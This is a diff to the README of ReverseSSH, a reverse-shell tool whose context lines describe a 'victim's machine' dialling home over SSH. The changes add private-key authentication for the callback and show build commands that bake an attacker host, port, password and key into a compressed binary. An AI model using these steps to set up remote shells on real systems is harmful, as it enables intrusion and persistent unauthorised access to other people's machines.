@@ -46,8 +46,8 @@ In short:
 
 Compiling additionally requires the following:
 
-* golang version 1.15
-* optionally `upx` for compression (e.g. `apt install upx-ucl`)
+* golang version 1.16
+* optionally `upx` for compression (e.g. `sudo apt install upx-ucl` for Debian-based)
 
 
 ## Usage
@@ -102,7 +102,6 @@ attacker$ ssh target
 
 In the end it's plain ssh, so you could catch the remote port forwarding call coming from the victim's machine with your openssh daemon listening on port 22.
 Just prepend `<USER>@` and provide the password once asked to do so.
-Dialling home currently is password only, because I didn't feel like baking a private key in there as well yet...
 
 For even more convenience, add the following to your `~/.ssh/config`, copy the [ssh private key](assets/id_reverse-ssh) to `~/.ssh/` and simply call `ssh target` or `sftp target` afterwards:
 
@@ -119,7 +118,7 @@ Host target
 ### Full usage
 
 ```
-reverseSSH v1.2.0  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>
+reverseSSH v1.3.1  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>
 
 Usage: reverse-ssh [options] [[<user>@]<target>]
 
@@ -178,6 +177,7 @@ You can also specify one or more of the following environmental variables when c
 * `RS_SHELL` to change the default shell
 * `RS_PASS` to provide your personalized password
 * `RS_PUB` to provide your personalized an authorized key
+* `PRIV_KEY` to authenticate with ssh private key when dialling home
 * `LUSER` to change the default username of the ssh connection attempt
 * `LHOST` to provide a default LHOST value and make **ReverseSSH default to the reverse scenario**
 * `LPORT` to change the default listening port or port where an ssh connection attempt is sent to
@@ -187,9 +187,9 @@ You can also specify one or more of the following environmental variables when c
 ```shell
 $ ssh-keygen -t ed25519 -f id_reverse-ssh
 
-$ RS_SHELL="/bin/sh" RS_PASS="secret" RS_PUB="$(cat id_reverse-ssh.pub)" make compressed
+$ RS_SHELL="/bin/sh" RS_PASS="secret" RS_PUB="path/to/id_reverse-ssh.pub" make compressed
 
-$ LHOST="192.168.0.10" LPORT="443" BPORT="0" RS_PUB="$(cat id_reverse-ssh.pub)" make compressed
+$ LHOST="192.168.0.10" LPORT="443" BPORT="0" RS_PUB="path/to/id_reverse-ssh.pub" make compressed
 ```
 
 ### Building for different operating systems or architectures
